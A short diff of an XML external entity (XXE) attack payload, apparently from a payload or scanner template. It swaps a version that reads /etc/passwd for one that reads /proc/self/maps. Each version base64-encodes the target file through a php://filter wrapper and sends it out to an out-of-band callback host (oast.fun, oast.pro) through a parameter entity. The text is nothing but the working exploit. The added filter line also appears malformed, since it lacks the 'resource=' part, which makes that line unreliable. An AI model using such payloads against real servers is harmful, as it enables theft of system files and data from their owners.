@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://cqq8fcgvkgthr1gp9rn0758fkkg6srt1f.oast.fun?%data;'>">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/proc/self/maps">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://cqq8k48vkgtj3dh07nh0xcqzx4pd739hg.oast.pro?%data;'>">
